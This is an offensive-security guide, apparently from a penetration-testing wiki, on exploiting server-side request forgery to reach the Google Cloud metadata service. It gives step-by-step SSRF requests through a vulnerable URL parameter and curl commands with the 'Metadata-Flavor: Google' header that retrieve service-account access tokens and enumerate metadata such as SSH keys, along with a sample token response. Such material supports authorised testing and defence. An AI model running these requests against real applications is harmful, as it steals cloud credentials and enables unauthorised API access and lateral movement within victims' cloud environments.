---
title: Exploiting GCP Metadata Services via SSRF
description: Learn to exploit SSRF vulnerabilities in GCP for metadata extraction
  and cloud pivoting techniques.
keywords:
- Google Cloud Platform
- SSRF
- metadata service
- cloud security
- service account tokens
- HTTP headers
- exploitation techniques
---

# Google Cloud Platform (GCP)

## Context

In this guide, we will explore how to exploit Server-Side Request Forgery (SSRF) vulnerabilities to access and extract sensitive data from the Google Cloud Platform (GCP) metadata service. The primary objective is to demonstrate the potential for data extraction and cloud pivoting using compromised metadata. This requires an understanding of HTTP headers, web form structures, cloud service models, as well as SSRF and cloud metadata services exploitation techniques.

## Theory

### GCP Metadata Service Architecture

GCP instances host an internal metadata service at the URL `http://metadata.google.internal/computeMetadata/v1/`, which is meant for exclusive internal access. The metadata service architecture assumes that only the virtual machine (VM) or authorized internal processes can reach this endpoint. However, if an SSRF vulnerability exists, an attacker can exploit this trust assumption to send crafted requests to the metadata endpoint.

### Access Control and Header Requirements

Access to the GCP metadata requires the use of a special HTTP header: `Metadata-Flavor: Google`. This header ensures that requests aiming to access metadata are legitimate and originate from within the GCP environment. Exploiting SSRF vulnerabilities allows an attacker to inject this specific header, thereby bypassing certain access controls meant to protect the metadata.

### Sensitive Data in GCP Metadata

The metadata service on GCP can expose several critical pieces of information, including:

- Service account tokens, which grant access to GCP APIs and resources.
- SSH keys used for accessing instances.
- Project information and custom metadata defined by users.

Obtaining service account tokens can have severe security implications, such as unauthorized API access, privilege escalation, and potential lateral movement within the cloud environment.

### Recursive Metadata Access and Enumeration

An attacker can enumerate available metadata using SSRF to identify all accessible paths. This recursive access allows for the extraction of sensitive keys and project information, leading to further exploit opportunities within the cloud infrastructure.

## Practice

### SSRF Exploitation of GCP Metadata Service for Token Extraction

1. **Identify SSRF Injection Point**: Locate a vulnerable parameter or feature in the target web application that accepts user-supplied URLs. This forms the entry point for SSRF exploitation.

2. **Target the Token Endpoint**: Use the endpoint `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` to aim for service account tokens.

   ```http
   GET /path?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
   Host: vulnerable-site.com
   ```

3. **Craft HTTP Request with Required Header**: Prepare an HTTP request incorporating `Metadata-Flavor: Google` header to satisfy GCPâ€™s access control mechanisms.

4. **Example Command for Metadata Token Extraction**:

   ```bash
   curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
   ```

5. **Trigger SSRF**: Execute the crafted request through the vulnerable application, thereby relaying the request to the internal metadata service.

6. **Expected Response**: A successful request yields an access token in JSON format.

   ```json
   {
       "access_token": "ya29.c.Elq...",
       "expires_in": 3599,
       "token_type": "Bearer"
   }
   ```

   Successfully obtaining this response indicates access to the service account token, enabling further cloud API exploitation.

### Recursive Enumeration of GCP Metadata via SSRF

1. **Initiate Recursive Enumeration**: Begin at the root of the metadata API.

   ```http
   GET /path?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
   Host: vulnerable-site.com
   ```

2. **List Metadata Keys**: Craft requests with the `Metadata-Flavor: Google` header to list available metadata keys.

   ```bash
   curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
   ```

3. **Recursively Extract Metadata**: Proceed to request sub-paths, such as `project/attributes/` and `ssh-keys`, to collect comprehensive metadata details.

By following these steps, an attacker can enumerate and extract sensitive metadata, providing substantial information for potential further exploits.

## Tools
- **curl**
- **Burp Suite**